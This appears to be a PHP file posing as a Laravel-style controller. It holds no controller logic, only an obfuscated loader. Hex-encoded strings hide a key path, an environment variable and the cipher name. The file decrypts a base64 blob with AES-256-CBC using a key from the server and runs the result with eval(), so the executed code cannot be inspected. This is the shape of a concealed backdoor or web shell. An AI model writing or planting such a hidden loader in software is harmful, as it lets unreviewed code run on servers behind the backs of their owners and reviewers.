<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('B6Y9DsLvU3afrsz5WqHWTQ==');

$c=base64_decode(

'kSJ73xKpH1IND2CZBCqMpeC5Ho1bFfDTS4WrlH1Qd4oZzTUSJhgedtjXwjMG4/221tdQZwBbrQt3' .
'TKHvbiFIRI7L2+HbLec3yCYe7Rpn8nYxg4hpOazMICeV07zwak3DOyRou5Byc/ILiDE8o98Zkc6E' .
'ap02IRZU9ojhmWTA6luQ7smE7rwftBm0nI+YJHL0gXmLCQ+AIk55Ob+skPJKa6q5MtR1tufxwCTz' .
'LPsXliZjkrW3hMsXNjRhym5HETZH'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

